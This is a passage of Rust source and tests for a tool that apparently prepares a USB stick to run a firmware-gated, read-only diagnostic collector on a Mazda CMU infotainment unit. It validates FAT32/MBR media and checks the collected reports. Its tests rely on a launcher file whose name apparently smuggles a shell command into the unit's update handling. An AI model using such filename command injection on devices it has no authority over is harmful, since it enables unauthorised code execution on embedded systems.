fn module_is_available(module_files: &str, loaded_modules: &str, module: &str) -> bool {
    loaded_modules
        .lines()
        .any(|line| line.split_whitespace().next() == Some(module))
        || module_files.lines().any(|line| {
            let file_name = line.rsplit('/').next().unwrap_or(line);
            [
                format!("{module}.ko"),
                format!("{module}.ko.gz"),
                format!("{module}.ko.xz"),
            ]
            .iter()
            .any(|candidate| file_name == candidate)
        })
}

fn parse_loaded_usb_network_modules(loaded_modules: &str) -> Vec<String> {
    let mut modules = loaded_modules
        .lines()
        .filter_map(|line| line.split_whitespace().next())
        .filter(|module| matches!(*module, "usbnet" | "asix" | "cdc_ether" | "cdc_ncm"))
        .map(str::to_owned)
        .collect::<Vec<_>>();
    modules.sort_unstable();
    modules.dedup();
    modules
}

fn posix_cksum(bytes: &[u8]) -> u32 {
    let mut checksum = 0_u32;
    for &byte in bytes {
        checksum = cksum_update(checksum, byte);
    }
    let mut length = u64::try_from(bytes.len()).expect("slice length fits in u64");
    while length != 0 {
        let byte = u8::try_from(length & 0xff).expect("masked length byte fits in u8");
        checksum = cksum_update(checksum, byte);
        length >>= 8;
    }
    !checksum
}

fn cksum_update(checksum: u32, byte: u8) -> u32 {
    let index = ((checksum >> 24) ^ u32::from(byte)) & 0xff;
    let mut polynomial = index << 24;
    for _ in 0..8 {
        polynomial = if polynomial & 0x8000_0000 == 0 {
            polynomial << 1
        } else {
            (polynomial << 1) ^ 0x04c1_1db7
        };
    }
    (checksum << 8) ^ polynomial
}

#[cfg(target_os = "macos")]
fn verify_macos_volume(destination: &Path) -> Result<(), PrepareError> {
    let mut components = destination.components();
    let is_volume_root = matches!(components.next(), Some(Component::RootDir))
        && matches!(components.next(), Some(Component::Normal(name)) if name == "Volumes")
        && matches!(components.next(), Some(Component::Normal(_)))
        && components.next().is_none();
    if !is_volume_root {
        return Err(PrepareError::DestinationOutsideMacVolumes);
    }

    let output = Command::new("/usr/sbin/diskutil")
        .args(["info", "-plist"])
        .arg(destination)
        .output()
        .map_err(|error| io_error("inspect volume with diskutil", destination, error))?;
    if !output.status.success() {
        return Err(io_error(
            "inspect volume with diskutil",
            destination,
            io::Error::other("diskutil returned a failure status"),
        ));
    }

    let volume_identity = parse_macos_volume_identity(&output.stdout)?;

    let disk_output = Command::new("/usr/sbin/diskutil")
        .args(["list", "-plist", &volume_identity.parent_whole_disk])
        .output()
        .map_err(|error| io_error("inspect partition map with diskutil", destination, error))?;
    if !disk_output.status.success() {
        return Err(io_error(
            "inspect partition map with diskutil",
            destination,
            io::Error::other("diskutil returned a failure status"),
        ));
    }

    validate_macos_volume_plists(&output.stdout, &disk_output.stdout)
}

#[cfg(any(target_os = "macos", test))]
#[derive(Debug)]
struct MacosVolumeIdentity {
    device_identifier: String,
    parent_whole_disk: String,
}

#[cfg(any(target_os = "macos", test))]
fn parse_plist(plist_bytes: &[u8]) -> Result<plist::Value, PrepareError> {
    plist::Value::from_reader(std::io::Cursor::new(plist_bytes))
        .map_err(|_| PrepareError::DestinationInvalidDiskMetadata)
}

#[cfg(any(target_os = "macos", test))]
fn parse_macos_volume_identity(volume_plist: &[u8]) -> Result<MacosVolumeIdentity, PrepareError> {
    let volume = parse_plist(volume_plist)?;
    let volume = volume
        .as_dictionary()
        .ok_or(PrepareError::DestinationInvalidDiskMetadata)?;
    let device_identifier = volume
        .get("DeviceIdentifier")
        .and_then(plist::Value::as_string)
        .ok_or(PrepareError::DestinationInvalidDiskMetadata)?;
    let parent_whole_disk = volume
        .get("ParentWholeDisk")
        .and_then(plist::Value::as_string)
        .ok_or(PrepareError::DestinationInvalidDiskMetadata)?;

    Ok(MacosVolumeIdentity {
        device_identifier: device_identifier.to_owned(),
        parent_whole_disk: parent_whole_disk.to_owned(),
    })
}

#[cfg(any(target_os = "macos", test))]
fn validate_macos_volume_plists(
    volume_plist: &[u8],
    whole_disk_plist: &[u8],
) -> Result<(), PrepareError> {
    let volume = parse_plist(volume_plist)?;
    let volume = volume
        .as_dictionary()
        .ok_or(PrepareError::DestinationInvalidDiskMetadata)?;
    let filesystem_type = volume
        .get("FilesystemType")
        .and_then(plist::Value::as_string);
    let filesystem_name = volume
        .get("FilesystemName")
        .and_then(plist::Value::as_string);
    if filesystem_type != Some("msdos")
        || !filesystem_name.is_some_and(|name| name.to_ascii_uppercase().contains("FAT32"))
    {
        return Err(PrepareError::DestinationNotFat32);
    }
    if volume
        .get("RemovableMedia")
        .and_then(plist::Value::as_boolean)
        != Some(true)
    {
        return Err(PrepareError::DestinationNotRemovable);
    }

    let identity = parse_macos_volume_identity(volume_plist)?;
    let expected_device = format!("{}s1", identity.parent_whole_disk);
    if identity.device_identifier != expected_device {
        return Err(PrepareError::DestinationNotFirstPartition);
    }

    let disk = parse_plist(whole_disk_plist)?;
    let all_disks = disk
        .as_dictionary()
        .and_then(|root| root.get("AllDisksAndPartitions"))
        .and_then(plist::Value::as_array)
        .ok_or(PrepareError::DestinationInvalidDiskMetadata)?;
    let parent = all_disks
        .iter()
        .filter_map(plist::Value::as_dictionary)
        .find(|entry| {
            entry
                .get("DeviceIdentifier")
                .and_then(plist::Value::as_string)
                == Some(identity.parent_whole_disk.as_str())
        })
        .ok_or(PrepareError::DestinationInvalidDiskMetadata)?;
    if parent.get("Content").and_then(plist::Value::as_string) != Some("FDisk_partition_scheme") {
        return Err(PrepareError::DestinationNotMbr);
    }
    let partitions = parent
        .get("Partitions")
        .and_then(plist::Value::as_array)
        .ok_or(PrepareError::DestinationInvalidDiskMetadata)?;
    if partitions.len() != 1 {
        return Err(PrepareError::DestinationNotSinglePartition);
    }
    let selected_partition = partitions[0]
        .as_dictionary()
        .ok_or(PrepareError::DestinationInvalidDiskMetadata)?;
    if selected_partition
        .get("DeviceIdentifier")
        .and_then(plist::Value::as_string)
        != Some(identity.device_identifier.as_str())
    {
        return Err(PrepareError::DestinationNotSinglePartition);
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    #[cfg(target_os = "linux")]
    use std::os::unix::fs::{symlink, MetadataExt, PermissionsExt};
    #[cfg(target_os = "linux")]
    use std::process::Command;
    #[cfg(target_os = "linux")]
    use std::time::Duration;
    use std::time::{SystemTime, UNIX_EPOCH};

    use super::*;

    const TARGET_VERSION_INI: &[u8] = b"JCI_SW_VER=\"MAZ_CMU-150_70.00.100\"\r\n\
JCI_SW_VER_PATCH=\"A\"\r\n\
JCI_SW_FLAVOR=\"NA\"\r\n\
JCI_SW_PART_NUMBER=\"SWI10-24818-807R02\"\r\n";

    struct TestDirectory(PathBuf);

    impl TestDirectory {
        fn new(label: &str) -> Self {
            let unique = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .expect("clock is after Unix epoch")
                .as_nanos();
            let path = std::env::temp_dir().join(format!(
                "mazda-cmu-inspect-{label}-{}-{unique}",
                std::process::id()
            ));
            fs::create_dir_all(&path).expect("create test directory");
            Self(path)
        }

        #[cfg(target_os = "linux")]
        fn write(&self, relative: &str, content: &[u8]) {
            let path = self.0.join(relative);
            fs::create_dir_all(path.parent().expect("fixture has a parent"))
                .expect("create fixture parent");
            fs::write(path, content).expect("write fixture");
        }

        #[cfg(target_os = "linux")]
        fn assert_no_firmware_gate_copy(&self) {
            assert!(fs::read_dir(&self.0).expect("list USB root").all(|entry| {
                !entry
                    .expect("read USB root entry")
                    .file_name()
                    .to_string_lossy()
                    .starts_with(".cmu-version-gate.")
            }));
        }
    }

    impl Drop for TestDirectory {
        fn drop(&mut self) {
            fs::remove_dir_all(&self.0).expect("remove test directory");
        }
    }

    #[cfg(target_os = "linux")]
    fn run_in_fixture_chroot(root: &Path, arguments: &[&str]) -> std::process::Output {
        let use_sudo = std::env::var_os("MAZDA_CMU_INSPECT_USE_SUDO_CHROOT").is_some();
        let mut command = if use_sudo {
            let mut command = Command::new("sudo");
            command.args(["-n", "chroot"]);
            command
        } else {
            let mut command = Command::new("unshare");
            command.args(["--user", "--map-root-user", "--mount", "chroot"]);
            command
        };
        command
            .arg(root)
            .args(arguments)
            .output()
            .expect("run command in fixture chroot")
    }

    #[cfg(target_os = "linux")]
    fn restore_fixture_ownership(root: &Path) {
        if std::env::var_os("MAZDA_CMU_INSPECT_USE_SUDO_CHROOT").is_some() {
            let metadata = fs::metadata(root).expect("inspect chroot owner");
            let userspec = format!("{}:{}", metadata.uid(), metadata.gid());
            let status = Command::new("sudo")
                .args(["-n", "chown", "-R", &userspec])
                .arg(root)
                .status()
                .expect("restore fixture ownership");
            assert!(status.success(), "could not restore fixture ownership");
        }
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn prepares_exact_payload_without_overwriting() {
        let usb = TestDirectory::new("prepare");

        prepare_payload_files(&usb.0).expect("prepare payload");

        assert_eq!(
            fs::read(usb.0.join(COLLECTOR_FILE_NAME)).expect("read collector"),
            COLLECTOR
        );
        assert_eq!(
            fs::read(usb.0.join(UPDATE_FLAG_FILE_NAME)).expect("read flag"),
            b"\n"
        );
        let launcher = launcher_file_name();
        assert!(usb.0.join(&launcher).is_file());
        assert!(!usb.0.join(STAGED_LAUNCHER_FILE_NAME).exists());
        assert!(matches!(
            prepare_payload_files(&usb.0),
            Err(PrepareError::DestinationNotEmpty(_))
        ));
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn prepared_entry_verification_reads_back_exact_payload_bytes() {
        let usb = TestDirectory::new("prepare-readback");
        prepare_payload_files(&usb.0).expect("prepare payload");
        let launcher = launcher_file_name();
        let payloads: [(&str, &[u8]); 3] = [
            (COLLECTOR_FILE_NAME, COLLECTOR),
            (UPDATE_FLAG_FILE_NAME, b"\n"),
            (&launcher, b"\n"),
        ];

        fs::write(usb.0.join(UPDATE_FLAG_FILE_NAME), b"changed").expect("corrupt prepared flag");
        assert!(matches!(
            verify_prepared_entries(&usb.0, &payloads),
            Err(PrepareError::PreparedPayloadMismatch(name)) if name == UPDATE_FLAG_FILE_NAME
        ));

        fs::write(usb.0.join(UPDATE_FLAG_FILE_NAME), b"\n").expect("restore prepared flag");
        fs::remove_file(usb.0.join(COLLECTOR_FILE_NAME)).expect("remove prepared collector");
        assert!(verify_prepared_entries(&usb.0, &payloads).is_err());
    }

    #[test]
    fn cleanup_removes_and_verifies_every_payload_name() {
        let usb = TestDirectory::new("cleanup");
        let launcher = launcher_file_name();
        let names = cleanup_payload_names(&launcher);
        for name in &names {
            fs::write(usb.0.join(name), b"fixture").expect("write cleanup fixture");
        }

        remove_and_verify_payload_absence(&usb.0, &launcher).expect("verify cleanup");

        assert!(names.iter().all(|name| !usb.0.join(name).exists()));
    }

    #[test]
    fn cleanup_failure_returns_explicit_unsafe_media_error() {
        let usb = TestDirectory::new("cleanup-failure");
        let launcher = launcher_file_name();
        fs::create_dir(usb.0.join(&launcher)).expect("create undeletable-as-file launcher fixture");

        let error = remove_and_verify_payload_absence(&usb.0, &launcher)
            .expect_err("directory at launcher name must fail cleanup");
        let message = error.to_string();

        assert!(matches!(
            error,
            PrepareError::UnsafeMediaAfterFailedCleanup(_)
        ));
        assert!(message.contains(
            "Media may contain an active launcher; do not insert it into the vehicle. Reformat the entire device."
        ));
        assert!(usb.0.join(&launcher).exists());
    }

    #[test]
    fn launcher_name_is_a_single_valid_fat_component() {
        let launcher = launcher_file_name();
        assert!(launcher.len() <= 255);
        assert!(!launcher.chars().any(|character| matches!(
            character,
            '<' | '>' | ':' | '"' | '/' | '\\' | '|' | '?' | '*'
        )));
        assert!(Path::new(&launcher)
            .extension()
            .is_some_and(|extension| extension.eq_ignore_ascii_case("up")));
        assert!(launcher.contains("sda1"));
        assert!(!launcher.contains("sdb1"));
        assert!(launcher.contains("cmu-inspect.sh"));
        assert!(!launcher.contains("for "));
        assert!(!launcher.contains("HOME%root"));
    }

    #[test]
    fn diskutil_plists_require_fat32_removable_media_and_mbr() {
        let volume = br#"
            <plist version="1.0"><dict>
            <key>FilesystemType</key><string>msdos</string>
            <key>FilesystemName</key><string>MS-DOS FAT32</string>
            <key>DeviceIdentifier</key><string>disk7s1</string>
            <key>ParentWholeDisk</key><string>disk7</string>
            <key>RemovableMedia</key><true/>
            </dict></plist>
        "#;
        let mbr = br#"
            <plist version="1.0"><dict><key>AllDisksAndPartitions</key><array><dict>
            <key>DeviceIdentifier</key><string>disk7</string>
            <key>Content</key><string>FDisk_partition_scheme</string>
            <key>Partitions</key><array><dict>
                <key>DeviceIdentifier</key><string>disk7s1</string>
                <key>Content</key><string>DOS_FAT_32</string>
            </dict></array>
            </dict></array></dict></plist>
        "#;
        assert!(validate_macos_volume_plists(volume, mbr).is_ok());

        let fat16 = String::from_utf8_lossy(volume).replace("FAT32", "FAT16");
        assert!(matches!(
            validate_macos_volume_plists(fat16.as_bytes(), mbr),
            Err(PrepareError::DestinationNotFat32)
        ));
        let fixed = String::from_utf8_lossy(volume).replace("<true/>", "<false/>");
        assert!(matches!(
            validate_macos_volume_plists(fixed.as_bytes(), mbr),
            Err(PrepareError::DestinationNotRemovable)
        ));
        let guid =
            String::from_utf8_lossy(mbr).replace("FDisk_partition_scheme", "GUID_partition_scheme");
        assert!(matches!(
            validate_macos_volume_plists(volume, guid.as_bytes()),
            Err(PrepareError::DestinationNotMbr)
        ));
    }

    #[test]
    fn diskutil_plists_reject_selected_second_partition() {
        let volume = br#"
            <plist version="1.0"><dict>
            <key>FilesystemType</key><string>msdos</string>
            <key>FilesystemName</key><string>MS-DOS FAT32</string>
            <key>DeviceIdentifier</key><string>disk7s2</string>
            <key>ParentWholeDisk</key><string>disk7</string>
            <key>RemovableMedia</key><true/>
            </dict></plist>
        "#;
        let mbr = br#"
            <plist version="1.0"><dict><key>AllDisksAndPartitions</key><array><dict>
            <key>DeviceIdentifier</key><string>disk7</string>
            <key>Content</key><string>FDisk_partition_scheme</string>
            <key>Partitions</key><array><dict>
                <key>DeviceIdentifier</key><string>disk7s2</string>
            </dict></array>
            </dict></array></dict></plist>
        "#;

        assert!(matches!(
            validate_macos_volume_plists(volume, mbr),
            Err(PrepareError::DestinationNotFirstPartition)
        ));
    }

    #[test]
    fn diskutil_plists_reject_multiple_partitions() {
        let volume = br#"
            <plist version="1.0"><dict>
            <key>FilesystemType</key><string>msdos</string>
            <key>FilesystemName</key><string>MS-DOS FAT32</string>
            <key>DeviceIdentifier</key><string>disk7s1</string>
            <key>ParentWholeDisk</key><string>disk7</string>
            <key>RemovableMedia</key><true/>
            </dict></plist>
        "#;
        let mbr = br#"
            <plist version="1.0"><dict><key>AllDisksAndPartitions</key><array><dict>
            <key>DeviceIdentifier</key><string>disk7</string>
            <key>Content</key><string>FDisk_partition_scheme</string>
            <key>Partitions</key><array>
              <dict><key>DeviceIdentifier</key><string>disk7s1</string></dict>
              <dict><key>DeviceIdentifier</key><string>disk7s2</string></dict>
            </array>
            </dict></array></dict></plist>
        "#;

        assert!(matches!(
            validate_macos_volume_plists(volume, mbr),
            Err(PrepareError::DestinationNotSinglePartition)
        ));
    }

    #[test]
    #[cfg(not(target_os = "macos"))]
    fn prepare_refuses_unsupported_platform_before_writing() {
        let usb = TestDirectory::new("firmware");

        let result = prepare_usb(&usb.0, TARGET_CONFIRMATION);

        assert!(matches!(result, Err(PrepareError::UnsupportedPlatform)));
        assert_eq!(fs::read_dir(&usb.0).expect("list USB").count(), 0);
    }

    #[test]
    #[cfg(target_os = "macos")]
    fn prepare_refuses_unconfirmed_target_before_writing() {
        let usb = TestDirectory::new("firmware");

        let result = prepare_usb(&usb.0, "cx5-2019.5-gt-74.00.324-na-n");

        assert!(matches!(result, Err(PrepareError::UnsupportedFirmware)));
        assert_eq!(fs::read_dir(&usb.0).expect("list USB").count(), 0);
    }

    #[test]
    fn firmware_identity_requires_exact_na_build_metadata() {
        let identity = FirmwareIdentity::parse(
            std::str::from_utf8(TARGET_VERSION_INI).expect("fixture is UTF-8"),
        )
        .expect("parse target identity");
        assert!(identity.is_supported());
        assert_eq!(identity.normalized_firmware(), SUPPORTED_FIRMWARE);

        for rejected in [
            std::str::from_utf8(TARGET_VERSION_INI)
                .expect("fixture is UTF-8")
                .replace("JCI_SW_FLAVOR=\"NA\"", "JCI_SW_FLAVOR=\"EU\""),
            std::str::from_utf8(TARGET_VERSION_INI)
                .expect("fixture is UTF-8")
                .replace("SWI10-24818-807R02", "SWI10-24818-003R02"),
            std::str::from_utf8(TARGET_VERSION_INI)
                .expect("fixture is UTF-8")
                .replace("JCI_SW_VER_PATCH=\"A\"", "JCI_SW_VER_PATCH=\"B\""),
            std::str::from_utf8(TARGET_VERSION_INI)
                .expect("fixture is UTF-8")
                .replace("MAZ_CMU-150_70.00.100", "NOT_THE_TARGET_70.00.100"),
            std::str::from_utf8(TARGET_VERSION_INI)
                .expect("fixture is UTF-8")
                .replace("JCI_SW_FLAVOR=\"NA\"", "JCI_SW_FLAVOR=\"UNRELATED_NA\""),
            std::str::from_utf8(TARGET_VERSION_INI)
                .expect("fixture is UTF-8")
                .replace("_70.00.100\"", "_70.00.100A\""),
            std::str::from_utf8(TARGET_VERSION_INI)
                .expect("fixture is UTF-8")
                .replace("JCI_SW_VER_PATCH=\"A\"", "JCI_SW_VER_PATCH=\"a\""),
        ] {
            assert!(!FirmwareIdentity::parse(&rejected)
                .expect("parse non-target identity")
                .is_supported());
        }

        let duplicate = format!(
            "{}JCI_SW_FLAVOR=\"NA\"\n",
            std::str::from_utf8(TARGET_VERSION_INI).expect("fixture is UTF-8")
        );
        assert!(FirmwareIdentity::parse(&duplicate).is_none());
    }

    #[test]
    fn collector_bounds_firmware_gate_before_parsing() {
        let collector = std::str::from_utf8(COLLECTOR).expect("collector is UTF-8");
        let applet_validation = collector
            .find("cksum /dev/null")
            .expect("collector validates cksum");
        let bounded_gate = collector
            .find("bounded_copy \"$VERSION_PATH\" \"$VERSION_GATE_COPY\" \"$BLOCKS_WITHOUT_SENTINEL\"")
            .expect("collector bounded-copies firmware identity");
        let parse_gate = collector
            .find("done <\"$VERSION_GATE_COPY\"")
            .expect("collector parses bounded firmware copy");

        assert!(applet_validation < bounded_gate);
        assert!(bounded_gate < parse_gate);
        assert!(!collector.contains("done <\"$VERSION_PATH\""));
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn busybox_1_19_production_fixture_exercises_launcher_and_timeout() {
        let Some(busybox_source) = std::env::var_os("MAZDA_CMU_INSPECT_BUSYBOX_1_19") else {
            return;
        };
        let version = Command::new(&busybox_source)
            .output()
            .expect("run pinned BusyBox fixture");
        let version_text = String::from_utf8_lossy(&version.stdout);
        assert!(version_text.contains("BusyBox v1.19.0"));

        let fixture = TestDirectory::new("busybox-1.19-chroot");
        for directory in ["bin", "dev", "jci", "root", "tmp/mnt/sda1"] {
            fs::create_dir_all(fixture.0.join(directory)).expect("create chroot directory");
        }
        let busybox = fixture.0.join("bin/busybox");
        fs::copy(&busybox_source, &busybox).expect("copy pinned BusyBox into chroot");
        fs::set_permissions(&busybox, fs::Permissions::from_mode(0o755))
            .expect("make pinned BusyBox executable");
        for applet in ["mkdir", "mv", "rm", "sh", "sync"] {
            symlink("busybox", fixture.0.join("bin").join(applet))
                .expect("install BusyBox applet link");
        }
        fs::write(fixture.0.join("dev/null"), b"").expect("create fixture null file");
        fs::write(fixture.0.join("jci/version.ini"), TARGET_VERSION_INI)
            .expect("write firmware fixture");
        let usb_root = fixture.0.join("tmp/mnt/sda1");
        fs::write(usb_root.join(COLLECTOR_FILE_NAME), COLLECTOR)
            .expect("write production collector path");
        fs::write(usb_root.join(UPDATE_FLAG_FILE_NAME), b"\n").expect("write update marker");
        let launcher = launcher_file_name();
        fs::write(usb_root.join(&launcher), b"\n").expect("write launcher fixture");

        let launcher_command =
            format!("HOME=/root; export HOME; PATH=/bin; export PATH; printf '%s\\n' {launcher}");
        let launcher_output = run_in_fixture_chroot(
            &fixture.0,
            &["/bin/busybox", "ash", "-c", &launcher_command],
        );
        let manifest_output = run_in_fixture_chroot(
            &fixture.0,
            &[
                "/bin/busybox",
                "cat",
                "/tmp/mnt/sda1/mazda-cmu-report/manifest.tsv",
            ],
        );
        let flush_marker_output = run_in_fixture_chroot(
            &fixture.0,
            &[
                "/bin/busybox",
                "cat",
                "/tmp/mnt/sda1/mazda-cmu-report/flush-complete",
            ],
        );

        let timeout_started = std::time::Instant::now();
        let timeout_output = run_in_fixture_chroot(
            &fixture.0,
            &[
                "/bin/busybox",
                "ash",
                "-c",
                "/bin/busybox timeout -t 1 -s KILL /bin/busybox sleep 5; timeout_status=$?; printf '%s\\n' \"$timeout_status\"",
            ],
        );
        let timeout_elapsed = timeout_started.elapsed();
        restore_fixture_ownership(&fixture.0);

        assert!(
            launcher_output.status.success(),
            "launcher chain failed: {}",
            String::from_utf8_lossy(&launcher_output.stderr)
        );
        assert_eq!(launcher_output.stdout, b".up\n");
        assert!(
            manifest_output.status.success(),
            "could not read production manifest: {}",
            String::from_utf8_lossy(&manifest_output.stderr)
        );
        let manifest = String::from_utf8(manifest_output.stdout).expect("manifest is UTF-8");
        assert!(manifest.ends_with("integrity\tcomplete\n"));
        assert!(
            flush_marker_output.status.success(),
            "could not read production flush marker: {}",
            String::from_utf8_lossy(&flush_marker_output.stderr)
        );
        assert_eq!(
            flush_marker_output.stdout,
            format!("flush\tcomplete\nbuild\t{REPORT_BUILD_ID}\n").as_bytes()
        );
        assert!(timeout_output.status.success());
        assert_eq!(timeout_output.stdout, b"137\n");
        assert!(timeout_elapsed < Duration::from_secs(4));
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn collector_does_not_search_past_firmware_gate_bound() {
        let usb = TestDirectory::new("bounded-gate-usb");
        let root = TestDirectory::new("bounded-gate-root");
        prepare_payload_files(&usb.0).expect("prepare payload");
        let mut version_ini = vec![b'x'; usize::try_from(MAX_CAPTURE_BYTES).expect("size fits")];
        version_ini.extend_from_slice(TARGET_VERSION_INI);
        root.write("jci/version.ini", &version_ini);

        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");

        assert!(!output.status.success());
        assert!(!usb.0.join("mazda-cmu-report").exists());
        usb.assert_no_firmware_gate_copy();
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn collector_is_firmware_gated_bounded_and_usb_only() {
        let usb = TestDirectory::new("collector-usb");
        let root = TestDirectory::new("collector-root");
        prepare_payload_files(&usb.0).expect("prepare payload");
        root.write("jci/version.ini", TARGET_VERSION_INI);
        root.write("proc/sys/kernel/osrelease", b"3.0.35\n");
        root.write("proc/version", b"Linux fixture\n");
        root.write("proc/cpuinfo", &vec![b'x'; 256 * 1024 + 4096]);
        root.write(
            "lib/modules/3.0.35/kernel/drivers/net/usb/asix.ko",
            b"fixture module",
        );
        root.write(
            "lib/modules/9.9.9/kernel/drivers/net/usb/cdc_ncm.ko",
            b"stale fixture module",
        );
        root.write(
            "lib/modules/3.0.35/kernel/drivers/net/usb/unrelated.ko",
            b"unrelated fixture module",
        );
        root.write("persistent/sentinel", b"unchanged");

        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");

        assert!(output.status.success());
        assert!(output.stdout.is_empty());
        assert!(output.stderr.is_empty());
        let report = usb.0.join("mazda-cmu-report");
        assert_eq!(
            fs::read(report.join("kernel-version.txt")).expect("read captured kernel"),
            b"Linux fixture\n"
        );
        assert_eq!(
            fs::metadata(report.join("cpuinfo.txt"))
                .expect("stat captured CPU info")
                .len(),
            256 * 1024
        );
        let manifest = fs::read_to_string(report.join("manifest.tsv")).expect("read manifest");
        assert!(manifest.contains("proc/cpuinfo\ttruncated\t262144\t"));
        assert_eq!(
            fs::read_to_string(report.join("flush-complete")).expect("read flush marker"),
            format!("flush\tcomplete\nbuild\t{REPORT_BUILD_ID}\n")
        );
        assert_eq!(
            fs::read_to_string(report.join("usb-network-modules.txt"))
                .expect("read USB network modules"),
            "lib/modules/3.0.35/kernel/drivers/net/usb/asix.ko\n"
        );
        let analysis = analyze_report(&report).expect("analyze report");
        assert_eq!(analysis.firmware, SUPPORTED_FIRMWARE);
        assert_eq!(
            analysis.software_part_number,
            SUPPORTED_SOFTWARE_PART_NUMBER
        );
        assert_eq!(
            analysis.available_usb_network_drivers,
            [UsbNetworkDriver::Asix]
        );
        assert_eq!(
            analysis.usb_network_driver_files_status,
            ObservationStatus::Ok
        );
        assert_eq!(
            analysis.loaded_usb_network_modules_status,
            ObservationStatus::NotFound
        );
        assert_eq!(
            fs::read(root.0.join("persistent/sentinel")).expect("read sentinel"),
            b"unchanged"
        );
        usb.assert_no_firmware_gate_copy();
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn failed_final_flush_cannot_leave_an_accepted_report() {
        let usb = TestDirectory::new("failed-final-flush-usb");
        let root = TestDirectory::new("failed-final-flush-root");
        prepare_payload_files(&usb.0).expect("prepare payload");
        root.write("jci/version.ini", TARGET_VERSION_INI);
        root.write("proc/sys/kernel/osrelease", b"3.0.35\n");

        let sync_program = usb.0.join("mock-sync.sh");
        let sync_state = usb.0.join("mock-sync-state");
        fs::write(
            &sync_program,
            b"#!/bin/sh\n\
state=${MAZDA_CMU_INSPECT_TEST_SYNC_STATE:?}\n\
count=0\n\
if [ -r \"$state\" ]; then IFS= read -r count <\"$state\"; fi\n\
count=$((count + 1))\n\
printf '%s\\n' \"$count\" >\"$state\" || exit 90\n\
[ \"$count\" -ne 2 ]\n",
        )
        .expect("write mock sync program");
        fs::set_permissions(&sync_program, fs::Permissions::from_mode(0o755))
            .expect("make mock sync executable");

        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .env("MAZDA_CMU_INSPECT_TEST_SYNC_PROGRAM", &sync_program)
            .env("MAZDA_CMU_INSPECT_TEST_SYNC_STATE", &sync_state)
            .output()
            .expect("run collector with failed final flush");

        assert_eq!(output.status.code(), Some(75));
        assert_eq!(
            fs::read_to_string(&sync_state).expect("read mock sync state"),
            "2\n"
        );
        let report = usb.0.join("mazda-cmu-report");
        let manifest = fs::read_to_string(report.join("manifest.tsv")).expect("read manifest");
        assert!(manifest.ends_with("integrity\tcomplete\n"));
        assert!(!report.join("flush-complete").exists());
        assert!(report.join(".flush-complete.part").exists());
        assert!(matches!(
            analyze_report(&report),
            Err(AnalyzeError::IncompleteReport)
        ));
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn analyzer_preserves_unavailable_usb_observation_statuses() {
        let usb = TestDirectory::new("unavailable-observations-usb");
        let root = TestDirectory::new("unavailable-observations-root");
        prepare_payload_files(&usb.0).expect("prepare payload");
        root.write("jci/version.ini", TARGET_VERSION_INI);
        root.write("proc/sys/kernel/osrelease", b"3.0.35\n");

        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");
        assert!(output.status.success());

        let analysis =
            analyze_report(&usb.0.join("mazda-cmu-report")).expect("analyze complete report");
        assert!(analysis.available_usb_network_drivers.is_empty());
        assert!(analysis.loaded_usb_network_modules.is_empty());
        assert_eq!(
            analysis.usb_network_driver_files_status,
            ObservationStatus::NotFound
        );
        assert_eq!(
            analysis.loaded_usb_network_modules_status,
            ObservationStatus::NotFound
        );
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn analyzer_rejects_invalid_utf8_in_successful_text_observation() {
        let usb = TestDirectory::new("malformed-observation-usb");
        let root = TestDirectory::new("malformed-observation-root");
        prepare_payload_files(&usb.0).expect("prepare payload");
        root.write("jci/version.ini", TARGET_VERSION_INI);
        root.write("proc/sys/kernel/osrelease", b"3.0.35\n");
        root.write("proc/modules", &[0xff, b'\n']);

        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");
        assert!(output.status.success());

        assert!(matches!(
            analyze_report(&usb.0.join("mazda-cmu-report")),
            Err(AnalyzeError::MalformedTextObservation("proc/modules"))
        ));
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn collector_refuses_other_firmware_without_creating_report() {
        let usb = TestDirectory::new("refusal-usb");
        let root = TestDirectory::new("refusal-root");
        prepare_payload_files(&usb.0).expect("prepare payload");
        root.write(
            "jci/version.ini",
            b"JCI_SW_VER=\"MAZ_CMU-150_74.00.324\"\n\
JCI_SW_VER_PATCH=\"A\"\n\
JCI_SW_FLAVOR=\"NA\"\n\
JCI_SW_PART_NUMBER=\"SWI10-26479-118R02\"\n",
        );

        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");

        assert!(!output.status.success());
        assert!(!usb.0.join("mazda-cmu-report").exists());
        usb.assert_no_firmware_gate_copy();
    }

    #[test]
